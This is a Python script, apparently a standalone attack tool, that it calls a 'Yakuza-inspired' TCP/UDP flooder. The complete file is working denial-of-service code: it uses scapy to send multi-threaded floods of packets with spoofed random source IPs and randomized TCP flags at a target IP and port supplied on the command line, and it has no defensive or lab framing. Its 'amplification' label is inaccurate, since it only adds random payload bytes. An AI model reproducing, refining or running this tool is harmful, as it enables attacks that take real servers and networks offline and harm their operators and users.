#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
YAKUZA-INSPIRED TCP/UDP FLOODER  
Fully weaponized with:  
- Multi-threaded flooding  
- IP spoofing  
- Packet randomization  
- Traffic amplification  
- Connection persistence  
"""
import os
import sys
import time
import random
import socket
import struct
import threading
import argparse
from scapy.all import *
from scapy.layers.inet import IP, UDP, TCP

## ========== GLOBAL CONFIG ========== ##
MAX_THREADS = 500  
TIMEOUT = 3.0  
PACKET_SIZE = 1024  
SPOOF_LEVEL = 32  # Bits to randomize in source IP  

## ========== CORE FLOODING CLASS ========== ##
class FloodEngine:
    def __init__(self):
        self.running = False
        self.threads = []
        self.sock = None
        self.stats = {
            'sent': 0,
            'errors': 0,
            'start_time': 0
        }

    def _rand_ip(self):
        """Generate random spoofed IP"""
        return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

    def _tcp_flood(self, target, port, duration):
        """TCP Flood with random flags"""
        flags = ['S', 'A', 'F', 'R', 'P', 'U']  
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            try:
                # Craft packet
                ip_layer = IP(
                    src=self._rand_ip(),
                    dst=target,
                    ttl=random.randint(64, 255))
                
                tcp_layer = TCP(
                    sport=random.randint(1024, 65535),
                    dport=port,
                    flags=random.choice(flags),
                    seq=random.randint(0, 4294967295),
                    window=random.randint(512, 65535))
                
                # Amplification
                raw_data = os.urandom(min(PACKET_SIZE, 1400))
                
                # Send
                send(ip_layer/tcp_layer/raw_data, verbose=0)
                self.stats['sent'] += 1
                
            except Exception as e:
                self.stats['errors'] += 1
        
    def _udp_flood(self, target, port, duration):
        """UDP Flood with amplification"""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            try:
                # Craft packet
                ip_layer = IP(
                    src=self._rand_ip(),
                    dst=target,
                    ttl=random.randint(64, 255))
                
                udp_layer = UDP(
                    sport=random.randint(1024, 65535),
                    dport=port)
                
                # Amplification data
                raw_data = os.urandom(min(PACKET_SIZE * 2, 1400))
                
                # Send
                send(ip_layer/udp_layer/raw_data, verbose=0)
                self.stats['sent'] += 1
                
            except Exception as e:
                self.stats['errors'] += 1

    def start_flood(self, attack_type, target, port, duration, threads):
        """Main attack controller"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Launch threads
        for _ in range(threads):
            if attack_type == 'tcp':
                t = threading.Thread(
                    target=self._tcp_flood,
                    args=(target, port, duration))
            else:
                t = threading.Thread(
                    target=self._udp_flood,
                    args=(target, port, duration))
            
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Monitor
        while any(t.is_alive() for t in self.threads):
            time.sleep(0.1)
        
        return self.stats

    def stop_flood(self):
        """Emergency stop"""
        self.running = False
        for t in self.threads:
            t.join()
        
## ========== COMMAND INTERFACE ========== ##
def show_banner():
    print(f"""
\033[91m
 ██╗   ██╗ █████╗ ██╗  ██╗██╗   ██╗ █████╗ 
 ╚██╗ ██╔╝██╔══██╗██║ ██╔╝██║   ██║██╔══██╗
  ╚████╔╝ ███████║█████╔╝ ██║   ██║███████║
   ╚██╔╝  ██╔══██║██╔═██╗ ██║   ██║██╔══██║
    ██║   ██║  ██║██║  ██╗╚██████╔╝██║  ██║
    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
\033[0m
TCP/UDP Flood Tool - Yakuza Methods
    """)

def parse_args():
    parser = argparse.ArgumentParser(description='Yakuza-inspired TCP/UDP flood tool')
    parser.add_argument('-t', '--type', required=True, choices=['tcp', 'udp'], 
                        help='Attack type (tcp/udp)')
    parser.add_argument('-T', '--target', required=True, 
                        help='Target IP address')
    parser.add_argument('-p', '--port', required=True, type=int,
                        help='Target port number')
    parser.add_argument('-d', '--duration', required=True, type=int,
                        help='Attack duration in seconds')
    parser.add_argument('-th', '--threads', type=int, default=100,
                        help=f'Number of threads (1-{MAX_THREADS}, default: 100)')
    
    return parser.parse_args()

def main():
    show_banner()
    
    if os.geteuid() != 0:
        print("\033[91m[!] Must be run as root!\033[0m")
        sys.exit(1)
    
    try:
        args = parse_args()
        
        # Validate arguments
        if args.threads < 1 or args.threads > MAX_THREADS:
            print(f"\033[91m[!] Threads must be between 1 and {MAX_THREADS}\033[0m")
            sys.exit(1)
            
        if args.port < 1 or args.port > 65535:
            print("\033[91m[!] Port must be between 1 and 65535\033[0m")
            sys.exit(1)
            
        if args.duration < 1:
            print("\033[91m[!] Duration must be positive\033[0m")
            sys.exit(1)
        
        # Start attack
        engine = FloodEngine()
        print(f"\n\033[92m[+] Attacking {args.target}:{args.port} for {args.duration} seconds with {args.threads} threads...\033[0m")
        
        stats = engine.start_flood(
            args.type, args.target, args.port, args.duration, args.threads)
        
        # Results
        print("\n\033[92m[+] Attack completed!\033[0m")
        print(f"  Packets sent: {stats['sent']}")
        print(f"  Errors: {stats['errors']}")
        print(f"  Duration: {time.time() - stats['start_time']:.2f}s")
        
    except KeyboardInterrupt:
        print("\n\033[91m[!] Stopping attack...\033[0m")
        if 'engine' in locals():
            engine.stop_flood()
        sys.exit(0)
        
    except Exception as e:
        print(f"\033[91m[!] Error: {str(e)}\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    main()